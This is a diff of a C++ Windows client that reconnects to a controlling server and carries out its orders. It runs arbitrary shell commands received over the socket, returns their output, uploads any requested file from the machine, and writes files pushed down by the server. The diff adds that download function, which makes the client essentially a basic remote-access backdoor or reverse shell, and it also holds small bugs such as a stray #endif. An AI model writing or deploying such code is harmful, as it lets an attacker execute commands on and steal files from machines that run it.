@@ -1,7 +1,6 @@
 #include <iostream>
 #include <WS2tcpip.h>
 #include <string>
-#include <inaddr.h>
 #include <fstream>
 #include <vector>
 
@@ -14,125 +13,168 @@
 
 using namespace std;
 
-SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
 
-
-int executeCommands(string commnads) {
-    char ch;
-    FILE* fpipe;
-    FILE* copy_fp;
-    FILE* tmp;
-    char* command = (char*)commnads.c_str();
-    copy_fp = fopen("C:\\C projects\\output_file_path.txt", "w");
-    fpipe = (FILE*)_popen(command, "r");
-    if (fpipe) {
-        while ((ch = fgetc(fpipe)) != EOF) {
-            fputc(ch, copy_fp);
-        }
-    }
-    else {
-        if (copy_fp) {
-            fprintf(copy_fp, "Sorry there was an error opening the file");
-        }
-    }
-    _pclose(fpipe);
-    fclose(copy_fp);
-    return 0;
+void executeCommands(string commands)
+{
+	char ch;
+	FILE* fpipe;
+	FILE* copy_fp;
+	char* command = (char*)commands.c_str();
+	copy_fp = fopen("C:\\C projects\\output_file_path.txt", "w");
+	fpipe = (FILE*)_popen(command, "r");
+	if (fpipe)
+	{
+		while ((ch = fgetc(fpipe)) != EOF)
+		{
+			fputc(ch, copy_fp);
+		}
+	}
+	else
+	{
+		if (copy_fp)
+		{
+			fprintf(copy_fp, "Sorry there was an error opening the file");
+		}
+	}
+	_pclose(fpipe);
+	fclose(copy_fp);
+	return;
 #endif
 }
 
 
-void giveFile(SOCKET socket, string fileName) {
-    const int BUFFER_SIZE = 1024;
-    vector<char> buffer(BUFFER_SIZE + 1, 0);
-    ifstream file(fileName, ifstream::binary);
-    while (true) {
-        file.read(buffer.data(), BUFFER_SIZE);
-        send(socket, buffer.data(), file.gcount(), 0);
-        if (!file)
-            break;
-    }
-    file.close();
+void send_file_to_server(SOCKET socket, string fileName)
+{
+	const int BUFFER_SIZE = 1024;
+	vector<char> buffer(BUFFER_SIZE + 1, 0);
+	ifstream file(fileName, ifstream::binary);
+	while (true)
+	{
+		file.read(buffer.data(), BUFFER_SIZE);
+		send(socket, buffer.data(), file.gcount(), 0);
+		if (!file)
+			break;
+	}
+	file.close();
 }
 
 
+void receive_file_from_server(SOCKET socket, string path)
+{
+	//char buffer[1024];
+	ofstream file{path, ofstream::binary};
+	vector<char> bufferr(1025, 0);
+	int size;
+	while (true)
+	{
+		size = recv(socket, bufferr.data(), 1024, 0);
 
-void Client() {
-    string ipAdress = "127.0.0.1"; //IP Address pf the server
-    int port = 7613; //Listtening port # on server
 
-
-    // Initialize Winsock
-
-    WSADATA data;
-    WORD ver = MAKEWORD(2, 2);
-    int wsResualt = WSAStartup(ver, &data);
-
-    if (wsResualt != 0) {
-        cerr << "Cant start Winsock";
-        return;
-    }
-
-    // Create socket
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-
-    if (sock == INVALID_SOCKET) {
-        cerr << "Cant create socket" << WSAGetLastError << endl;
-        WSACleanup();
-        return;
-    }
-    // Fill in a hint structure
-    sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(port);
-    inet_pton(AF_INET, ipAdress.c_str(), &hint.sin_addr);
-
-    // Connect to server
-    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
-    if (connResult == SOCKET_ERROR) {
-        cerr << "Cant connect to server" << WSAGetLastError << endl;
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-
-    //Do-while loop to send and receive data
-    char buf[1024];
-    string userInput;
-
-    while (true) {
-        ZeroMemory(buf, 1024);
-        int bytesRecived = recv(sock, buf, 1024, 0);
-        string command = string(buf, 0, bytesRecived);
-
-        if (command.find("cmd ") == 0) {
-            try {
-                command = command.substr(4, command.size() - 1);
-                executeCommands(command);
-                giveFile(sock, "C:\\C projects\\output_file_path.txt");
-            }
-            catch (exception) {
-                string error = "Error with " + command + " command";
-                send(sock, error.c_str(), error.size() + 1, 0);
-            }
-
-        }
-        else if (command.find("get file ") == 0) {
-            command = command.substr(9, command.size() - 1);
-            giveFile(sock, command);
-        }
-        else {
-            string problem{ "Cant find the command " + command };
-            send(sock, problem.c_str(), problem.size() + 1, 0);
-        }
-    }
-
-    // Gracefully close down everything
-    closesocket(sock);
-    WSACleanup();
+		if (!bufferr.data() || size < 1024)
+		{
+			file.write(bufferr.data(), size);
+			file.flush();
+			file.close();
+			break;
+		}
+		file.write(bufferr.data(), size);
+	}
 }
 
 
-int main() {
-    Client();
+void Client()
+{
+	string ipAdress = "127.0.0.1"; //IP Address pf the server
+	int port = 7613; //Listtening port # on server
+
+
+	// Initialize Winsock
+
+	WSADATA data;
+	WORD ver = MAKEWORD(2, 2);
+	int wsResualt = WSAStartup(ver, &data);
+
+	if (wsResualt != 0)
+	{
+		cerr << "Cant start Winsock";
+		return;
+	}
+
+	// Create socket
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	if (sock == INVALID_SOCKET)
+	{
+		cerr << "Cant create socket" << WSAGetLastError << endl;
+		WSACleanup();
+		return;
+	}
+	// Fill in a hint structure
+	sockaddr_in hint;
+	hint.sin_family = AF_INET;
+	hint.sin_port = htons(port);
+	inet_pton(AF_INET, ipAdress.c_str(), &hint.sin_addr);
+
+	// Connect to serverT
+	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
+	if (connResult == SOCKET_ERROR)
+	{
+		cerr << "Cant connect to server" << WSAGetLastError << endl;
+		closesocket(sock);
+		WSACleanup();
+		return;
+	}
+
+	//Do-while loop to send and receive data
+	char buf[1024];
+	string userInput;
+
+	while (true)
+	{
+		ZeroMemory(buf, 1024);
+		int bytesRecived = recv(sock, buf, 1024, 0);
+		string command = string(buf, 0, bytesRecived);
+
+		if (command.find("cmd ") == 0)
+		{
+			try
+			{
+				command = command.substr(4, command.size() - 1);
+				executeCommands(command);
+				send_file_to_server(sock, "C:\\C projects\\output_file_path.txt");
+			}
+			catch (exception)
+			{
+				string error = "Error with " + command + " command";
+				send(sock, error.c_str(), error.size() + 1, 0);
+			}
+		}
+		else if (command.find("get file ") == 0)
+		{
+			command = command.substr(9, command.size() - 1);
+			send_file_to_server(sock, command);
+		}
+		else if (command.find("download file ") == 0)
+		{
+			bytesRecived = recv(sock, buf, 1024, 0);
+			string path = string(buf, 0, bytesRecived);
+			receive_file_from_server(sock, path);
+		}
+		else
+		{
+			string problem{"Cant find the command " + command};
+			send(sock, problem.c_str(), problem.size() + 1, 0);
+			break;
+		}
+	}
+
+	// Gracefully close down everything
+	closesocket(sock);
+	WSACleanup();
+}
+
+
+int main()
+{
+	Client();
 }
